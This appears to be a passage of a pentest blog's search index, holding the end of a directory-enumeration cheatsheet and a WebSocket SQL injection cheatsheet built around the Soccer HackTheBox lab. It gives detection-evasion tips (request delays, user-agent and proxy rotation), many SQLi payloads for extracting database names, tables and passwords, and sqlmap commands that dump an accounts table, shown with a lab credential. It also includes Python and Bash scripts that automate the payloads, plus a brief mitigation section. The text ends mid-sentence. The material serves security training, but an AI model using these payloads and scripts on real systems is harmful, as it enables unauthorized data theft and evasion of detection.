class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configuration files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Database files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"stealth-and-evasion\"\u003eStealth and Evasion\u003c/h2\u003e\n\u003ch3 id=\"rate-limiting-and-timing\"\u003eRate Limiting and Timing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Slow scan to avoid detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt --delay 100ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Random User-Agent rotation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --random-agent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Custom User-Agent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -a \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0 (Googlebot)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Proxy rotation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"request-modification\"\u003eRequest Modification\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add realistic headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -H \u003cspan class=\"s2\"\u003e\u0026#34;Accept: text/html,application/xhtml+xml\u0026#34;\u003c/span\u003e -H \u003cspan class=\"s2\"\u003e\u0026#34;Accept-Language: en-US,en;q=0.9\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Session-based enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -c \u003cspan class=\"s2\"\u003e\u0026#34;PHPSESSID=abc123; auth_token=xyz789\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Method tampering\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ -X POST\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"analysis-and-follow-up\"\u003eAnalysis and Follow-up\u003c/h2\u003e\n\u003ch3 id=\"response-analysis\"\u003eResponse Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for interesting status codes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -E \u003cspan class=\"s2\"\u003e\u0026#34;(200|301|302|403)\u0026#34;\u003c/span\u003e gobuster-results.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for unusual response sizes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;{print $3, $1}\u0026#39;\u003c/span\u003e gobuster-results.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -n\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract found directories for further enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;Status: 200\u0026#34;\u003c/span\u003e gobuster-results.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $1}\u0026#39;\u003c/span\u003e \u0026gt; found-dirs.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"automated-follow-up\"\u003eAutomated Follow-up\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Recursive enumeration of found directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003eread\u003c/span\u003e dir\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    gobuster dir -u http://target.com\u003cspan class=\"nv\"\u003e$dir\u003c/span\u003e -w wordlist.txt -x php,html\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; found-dirs.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Screenshot found pages\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003eread\u003c/span\u003e url\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    cutycapt --url\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$url\u003c/span\u003e --out\u003cspan class=\"o\"\u003e=\u003c/span\u003escreenshots/\u003cspan class=\"k\"\u003e$(\u003c/span\u003ebasename \u003cspan class=\"nv\"\u003e$url\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e.png\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e \u0026lt; found-urls.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"common-findings-and-next-steps\"\u003eCommon Findings and Next Steps\u003c/h2\u003e\n\u003ch3 id=\"interesting-directories-to-investigate\"\u003eInteresting Directories to Investigate\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/admin/\u003c/code\u003e - Administrative interfaces\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/backup/\u003c/code\u003e - Backup files and archives\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/config/\u003c/code\u003e - Configuration files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/uploads/\u003c/code\u003e - File upload functionality\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/api/\u003c/code\u003e - API endpoints\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/docs/\u003c/code\u003e - Documentation\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/test/\u003c/code\u003e - Test files and environments\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/dev/\u003c/code\u003e - Development resources\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"file-types-to-prioritize\"\u003eFile Types to Prioritize\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e.php\u003c/code\u003e, \u003ccode\u003e.asp\u003c/code\u003e, \u003ccode\u003e.jsp\u003c/code\u003e - Server-side scripts\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.config\u003c/code\u003e, \u003ccode\u003e.ini\u003c/code\u003e, \u003ccode\u003e.yaml\u003c/code\u003e - Configuration files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.sql\u003c/code\u003e, \u003ccode\u003e.db\u003c/code\u003e - Database files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.log\u003c/code\u003e - Log files with potential sensitive data\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.bak\u003c/code\u003e, \u003ccode\u003e.old\u003c/code\u003e - Backup files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.git/\u003c/code\u003e, \u003ccode\u003e.svn/\u003c/code\u003e - Version control directories\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"tips-and-best-practices\"\u003eTips and Best Practices\u003c/h2\u003e\n\u003ch3 id=\"performance-optimization\"\u003ePerformance Optimization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eStart with small wordlists for quick wins\u003c/li\u003e\n\u003cli\u003eUse appropriate thread counts (10-50 for most servers)\u003c/li\u003e\n\u003cli\u003eImplement delays for rate-limited or slow servers\u003c/li\u003e\n\u003cli\u003eUse recursive scanning judiciously to avoid infinite loops\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"detection-avoidance\"\u003eDetection Avoidance\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eRotate User-Agents and request headers\u003c/li\u003e\n\u003cli\u003eImplement random delays between requests\u003c/li\u003e\n\u003cli\u003eUse proxy chains for sensitive targets\u003c/li\u003e\n\u003cli\u003eMonitor for rate limiting or blocking responses\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"coverage-maximization\"\u003eCoverage Maximization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse multiple tools with different algorithms\u003c/li\u003e\n\u003cli\u003eCombine wordlists for comprehensive coverage\u003c/li\u003e\n\u003cli\u003eInclude technology-specific extensions\u003c/li\u003e\n\u003cli\u003eFollow up manual testing on interesting findings\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eAlways ensure you have proper authorization before conducting directory enumeration on any target system.\u003c/em\u003e\u003c/p\u003e","title":"Web Directory Enumeration Cheatsheet"},{"content":"WebSocket SQL Injection Cheatsheet WebSocket Basics WebSocket Connection // Basic WebSocket connection var ws = new WebSocket(\u0026#34;ws://target.com:9091\u0026#34;); // With specific endpoint var ws = new WebSocket(\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;); // Secure WebSocket var wss = new WebSocket(\u0026#34;wss://target.com:443/ws\u0026#34;); WebSocket Message Format // JSON message format ws.send(JSON.stringify({ \u0026#34;id\u0026#34;: \u0026#34;value_to_test\u0026#34; })) // Simple string message ws.send(\u0026#34;test_value\u0026#34;) // Complex JSON structure ws.send(JSON.stringify({ \u0026#34;action\u0026#34;: \u0026#34;query\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;vulnerable_parameter\u0026#34; } })) Testing WebSocket Connections Manual Browser Testing // Open browser console and connect var ws = new WebSocket(\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;); ws.onopen = function(e) { console.log(\u0026#39;Connected to WebSocket\u0026#39;); } ws.onmessage = function(e) { console.log(\u0026#39;Received:\u0026#39;, e.data); } // Send test payloads ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;})) ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;\u0026#34;})) ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;})) Using wscat # Install wscat npm install -g wscat # Connect to WebSocket wscat -c ws://soc-player.soccer.htb:9091 # Send JSON payloads \u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;} \u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;1\u0026#39;\u0026#34;} \u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;1 OR 1=1\u0026#34;} \u0026gt; {\u0026#34;id\u0026#34;:\u0026#34;92130 or 5=1-- -\u0026#34;} SQL Injection Detection Basic Detection Payloads // Test for errors with single quote {\u0026#34;id\u0026#34;: \u0026#34;\u0026#39;\u0026#34;} // Test for boolean conditions {\u0026#34;id\u0026#34;: \u0026#34;1 AND 1=1\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1 AND 1=2\u0026#34;} // Test for time delays {\u0026#34;id\u0026#34;: \u0026#34;1 AND SLEEP(5)\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026#34;} // Test for union-based injection {\u0026#34;id\u0026#34;: \u0026#34;1 UNION SELECT 1,2,3\u0026#34;} Error-Based Detection // MySQL error triggers {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\\\u0026#34;\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1`\u0026#34;} // SQL Server error triggers {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1]\u0026#34;} // PostgreSQL error triggers {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1$\u0026#34;} Boolean-Based Detection // True condition {\u0026#34;id\u0026#34;: \u0026#34;92130 or 5=5-- -\u0026#34;} // False condition {\u0026#34;id\u0026#34;: \u0026#34;92130 or 5=6-- -\u0026#34;} // String comparison {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; OR \u0026#39;a\u0026#39;=\u0026#39;a\u0026#39;-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; OR \u0026#39;a\u0026#39;=\u0026#39;b\u0026#39;-- -\u0026#34;} sqlmap with WebSockets Basic sqlmap Usage # Test WebSocket with JSON payload sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --batch # With specific risk and level sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --level 5 --risk 3 --batch # Enable threading for faster execution sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --level 5 --risk 3 --batch --threads 10 Database Enumeration # Enumerate databases sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --dbs --batch # Enumerate tables in specific database sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; -D soccer_db --tables --batch # Dump specific table sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; -D soccer_db -T accounts --dump --batch # Dump all data from database sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; -D soccer_db --dump --batch Advanced sqlmap Options # Force specific DBMS sqlmap -u \u0026#39;ws://target:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --dbms=mysql --batch # Custom tamper scripts sqlmap -u \u0026#39;ws://target:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --tamper=space2comment --batch # Specify injection technique sqlmap -u \u0026#39;ws://target:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --technique=BT --batch # Save session sqlmap -u \u0026#39;ws://target:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --batch --session-file=session.db Manual Exploitation Techniques Boolean-Based Blind Injection // Check for MySQL {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND (SELECT COUNT(*) FROM information_schema.tables) \u0026gt; 0-- -\u0026#34;} // Extract database name length {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND LENGTH(database()) = 9-- -\u0026#34;} // Extract database name character by character {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND SUBSTRING(database(),1,1) = \u0026#39;s\u0026#39;-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND SUBSTRING(database(),2,1) = \u0026#39;o\u0026#39;-- -\u0026#34;} // Extract table names {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = \u0026#39;accounts\u0026#39;-- -\u0026#34;} Time-Based Blind Injection // MySQL time delays {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND SLEEP(5)-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND IF(LENGTH(database())=9,SLEEP(5),0)-- -\u0026#34;} // SQL Server time delays {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;; IF (LEN(DB_NAME())=9) WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- -\u0026#34;} // PostgreSQL time delays {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND (SELECT 1 FROM pg_sleep(5))-- -\u0026#34;} // Conditional time delays {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND (CASE WHEN (SUBSTRING(user(),1,1)=\u0026#39;r\u0026#39;) THEN SLEEP(5) ELSE 0 END)-- -\u0026#34;} Union-Based Injection // Determine number of columns {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; ORDER BY 1-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; ORDER BY 2-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; ORDER BY 3-- -\u0026#34;} // Test for UNION compatibility {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT NULL-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT NULL,NULL-- -\u0026#34;} // Extract database information {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT @@version,user()-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT database(),NULL-- -\u0026#34;} // Extract table data {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -\u0026#34;} {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT username,password FROM accounts-- -\u0026#34;} WebSocket-Specific Payloads JSON Context Injection // Basic JSON structure {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;} // Nested JSON injection { \u0026#34;user_data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; UNION SELECT password FROM users-- -\u0026#34; } } // Array-based injection { \u0026#34;ids\u0026#34;: [\u0026#34;1\u0026#34;, \u0026#34;2\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1-- -\u0026#34;, \u0026#34;3\u0026#34;] } Message Format Variations // Different parameter names {\u0026#34;user_id\u0026#34;: \u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;} {\u0026#34;session_id\u0026#34;: \u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;} {\u0026#34;query\u0026#34;: \u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;} // Multiple parameters { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#39; OR 1=1-- -\u0026#34; } // Base64 encoded payloads {\u0026#34;id\u0026#34;: \u0026#34;MSBPUiAxPTEtLSAt\u0026#34;} // 1 OR 1=1-- - Real-World Example: Soccer HTB Connection Setup // Target WebSocket from Soccer HTB var ws = new WebSocket(\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;); ws.onopen = function(e) { console.log(\u0026#39;Connected to soccer WebSocket\u0026#39;); } ws.onmessage = function(e) { console.log(\u0026#39;Response:\u0026#39;, e.data); } Testing Process // 1. Test basic functionality ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;})) // 2. Test for SQL injection ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39;\u0026#34;})) // 3. Boolean-based testing ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;92130 or 5=1-- -\u0026#34;})) // 4. Confirm vulnerability ws.send(JSON.stringify({\u0026#34;id\u0026#34;: \u0026#34;1 OR 1=1-- -\u0026#34;})) sqlmap Exploitation # Soccer HTB WebSocket SQLi sqlmap -u \u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump # Results found: # Database: soccer_db # Table: accounts # [1 entry] # +------+-------------------+----------------------+----------+ # | id | email | password | username | # +------+-------------------+----------------------+----------+ # | 1324 | player@player.htb | PlayerOftheMatch2022 | player | # +------+-------------------+----------------------+----------+ Detection and Response Analysis Response Analysis # Look for different response patterns # - Response time differences (time-based) # - Content length variations (boolean-based) # - Error messages (error-based) # - Data extraction (union-based) # Response timing measurement time echo \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;1 AND SLEEP(5)\u0026#34;}\u0026#39; | wscat -c ws://target:9091 Database Fingerprinting // MySQL detection {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND @@version LIKE \u0026#39;%mysql%\u0026#39;-- -\u0026#34;} // SQL Server detection {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND @@version LIKE \u0026#39;%Microsoft%\u0026#39;-- -\u0026#34;} // PostgreSQL detection {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND version() LIKE \u0026#39;%PostgreSQL%\u0026#39;-- -\u0026#34;} // SQLite detection {\u0026#34;id\u0026#34;: \u0026#34;1\u0026#39; AND sqlite_version() IS NOT NULL-- -\u0026#34;} Automation Scripts Python WebSocket SQLi Script import websocket import json import time def test_websocket_sqli(url, payloads): def on_message(ws, message): print(f\u0026#34;Response: {message}\u0026#34;) def on_error(ws, error): print(f\u0026#34;Error: {error}\u0026#34;) def on_close(ws, close_status_code, close_msg): print(\u0026#34;Connection closed\u0026#34;) def on_open(ws): print(\u0026#34;Connected to WebSocket\u0026#34;) for payload in payloads: data = json.dumps({\u0026#34;id\u0026#34;: payload}) print(f\u0026#34;Sending: {data}\u0026#34;) ws.send(data) time.sleep(1) ws.close() ws = websocket.WebSocketApp(url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close) ws.run_forever() # Usage payloads = [ \u0026#34;1\u0026#34;, \u0026#34;1\u0026#39;\u0026#34;, \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;, \u0026#34;1\u0026#39; AND SLEEP(5)-- -\u0026#34;, \u0026#34;1 UNION SELECT @@version-- -\u0026#34; ] test_websocket_sqli(\u0026#34;ws://target:9091\u0026#34;, payloads) Bash Testing Script #!/bin/bash # WebSocket SQLi Testing Script URL=\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34; echo \u0026#34;Testing WebSocket SQL Injection\u0026#34; echo \u0026#34;Target: $URL\u0026#34; # Array of payloads to test payloads=( \u0026#34;1\u0026#34; \u0026#34;1\u0026#39;\u0026#34; \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1-- -\u0026#34; \u0026#34;92130 or 5=1-- -\u0026#34; \u0026#34;1 AND SLEEP(5)-- -\u0026#34; \u0026#34;1 UNION SELECT @@version-- -\u0026#34; ) for payload in \u0026#34;${payloads[@]}\u0026#34;; do echo \u0026#34;Testing payload: $payload\u0026#34; echo \u0026#34;{\\\u0026#34;id\\\u0026#34;:\\\u0026#34;$payload\\\u0026#34;}\u0026#34; | wscat -c $URL echo \u0026#34;---\u0026#34; sleep 2 done Mitigation and Prevention Secure WebSocket Implementation // Input validation function validateInput(data) { // Whitelist allowed characters if (!/^[a-zA-Z0-9_-]+$/.test(data)) { throw new Error(\u0026#34;Invalid input\u0026#34;); } return data; } // Parameterized queries const query = \u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;; db.query(query, [userId], callback); // Prepared statements const stmt = db.prepare(\u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;); stmt.run(userId); WebSocket Security Headers // Implement proper authentication ws.on(\u0026#39;connection\u0026#39;, function(socket, request) { // Verify JWT token or session if (!isAuthenticated(request)) { socket.close(1008, \u0026#39;Authentication required\u0026#39;); return; } }); // Rate limiting const rateLimiter = new Map(); ws.on(\u0026#39;message\u0026#39;, function(data) { const clientId = getClientId(this); if (isRateLimited(clientId)) { this.close(1008, \u0026#39;Rate limit exceeded\u0026#39;); return; } }); Tools and Resources WebSocket Testing Tools wscat - Command-line WebSocket client Burp Suite - Professional WebSocket testing OWASP ZAP - Free WebSocket proxy websocat - Advanced WebSocket client sqlmap - Automated SQL injection testing Browser Developer Tools // Chrome/Firefox WebSocket inspection // 1. Open Developer Tools (F12) // 2. Go to Network tab // 3. Filter by WS (WebSocket) // 4. Interact with application // 5. Analyze WebSocket frames WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized 